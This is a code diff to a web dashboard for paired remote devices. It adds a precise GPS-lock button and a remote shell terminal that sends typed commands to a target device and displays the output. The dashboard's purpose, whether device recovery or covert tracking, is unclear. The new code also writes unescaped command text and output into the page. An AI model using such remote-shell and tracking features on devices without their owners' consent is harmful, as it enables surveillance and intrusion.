@@ -234,9 +234,16 @@
           <div class="tool-grid">
             <button class="tool-btn full" onclick="cmd('forensic-init')">🔬 FULL FORENSIC SCAN</button>
             <button class="tool-btn full" onclick="cmd('full-recovery-scan')">⚡ FULL RECOVERY SCAN</button>
+            <button class="tool-btn full" onclick="cmd('locate-precise')">🎯 PRECISE GPS LOCK</button>
           </div>
           <div class="tool-section-title" style="margin-top:12px">ML Tracking Intel</div>
           <div class="log-box" id="ml-box" style="max-height:120px;font-size:9px;color:var(--p)">Waiting for agent data...</div>
+          <div class="tool-section-title" style="margin-top:12px">🖥️ Remote Shell Terminal</div>
+          <div style="background:#000;border:1px solid var(--bd);border-radius:8px;padding:6px;font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--gn);max-height:150px;overflow-y:auto" id="shell-output">Connect agent to use remote shell...</div>
+          <div style="display:flex;gap:4px;margin-top:4px">
+            <input type="text" id="shell-input" placeholder="Type command (e.g. whoami, ipconfig, dir)" style="flex:1;background:#000;border:1px solid var(--bd);border-radius:4px;padding:4px 8px;font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--gn);outline:none" onkeydown="if(event.key==='Enter')sendShellCmd()">
+            <button class="tool-btn" onclick="sendShellCmd()" style="margin:0;padding:4px 8px;font-size:10px">▶ Run</button>
+          </div>
         </div>
         <div class="tool-section">
           <div class="tool-section-title">Intel Stream</div>
@@ -674,6 +681,8 @@ function handleResult(msg){
     const r=typeof msg.result==='string'?JSON.parse(msg.result):msg.result;
     const cmd=msg.commandType||'';
     log('✅ '+cmd+' done','RES');
+    // Handle shell-exec results specially
+    if(cmd==='shell-exec'){handleShellResult(msg.result);return}
     // Handle locate results — extract location and update map
     if(cmd==='locate'||cmd==='location'){
       const loc=r.location||r;
@@ -1023,6 +1032,51 @@ function toggleSidebar(){const s=document.getElementById('sidebar');sbOpen=!sbOp
 function togglePanel(id){const p=document.getElementById(id+'-panel');const b=document.querySelector(`[onclick="togglePanel('${id}')"]`);pVis[id]=!pVis[id];p.classList.toggle('hidden-panel',!pVis[id]);b.classList.toggle('active',pVis[id])}
 function log(msg,tag){const el=document.getElementById('log-box');const ts=new Date().toLocaleTimeString('en-US',{hour12:false});el.innerHTML=`<div class="log-line"><span style="color:#555">[${ts}]</span> <span style="color:var(--bl)">[${tag||'SYS'}]</span> ${msg}</div>`+el.innerHTML}
 function rePair(){if(ws)ws.close();if(statusT)clearInterval(statusT);if(hbT)clearInterval(hbT);localStorage.clear();location.reload()}
+
+// ===== REMOTE SHELL TERMINAL =====
+let shellHistory=[];let shellHistIdx=-1;
+async function sendShellCmd(){
+  const input=document.getElementById('shell-input');
+  const cmd=input.value.trim();
+  if(!cmd)return;
+  if(!PC){toast('Not paired');return}
+  input.value='';
+  const out=document.getElementById('shell-output');
+  out.innerHTML+=`<div style="color:var(--cy)">$ ${cmd}</div>`;
+  out.scrollTop=out.scrollHeight;
+  shellHistory.push(cmd);shellHistIdx=shellHistory.length;
+  try{
+    const target=getTargetDevice();
+    const r=await apiP('/api/remote-shell',{deviceId:target,command:cmd,pairCode:PC});
+    if(r.success&&r.sent){
+      toast('Command sent');
+      // Result will come via WS commandResult
+    }else if(r.agentOnline===false){
+      out.innerHTML+=`<div style="color:var(--rd)">Agent offline — cannot execute</div>`;
+      out.scrollTop=out.scrollHeight;
+    }else{
+      out.innerHTML+=`<div style="color:var(--rd)">Failed: ${r.error||'unknown'}</div>`;
+      out.scrollTop=out.scrollHeight;
+    }
+  }catch(e){
+    out.innerHTML+=`<div style="color:var(--rd)">Error: ${e.message}</div>`;
+    out.scrollTop=out.scrollHeight;
+  }
+}
+// Intercept shell-exec results from WS
+function handleShellResult(result){
+  const out=document.getElementById('shell-output');
+  if(!out)return;
+  try{
+    const r=typeof result==='string'?JSON.parse(result):result;
+    if(r.output){
+      const lines=r.output.split('\n').slice(0,50).join('\n');
+      out.innerHTML+=`<div style="color:var(--wh)">${lines}</div>`;
+    }
+    if(r.error)out.innerHTML+=`<div style="color:var(--rd)">${r.error}</div>`;
+    out.scrollTop=out.scrollHeight;
+  }catch(e){}
+}
 
 // ===== AUTO-LOGIN =====
 window.addEventListener('load',()=>{
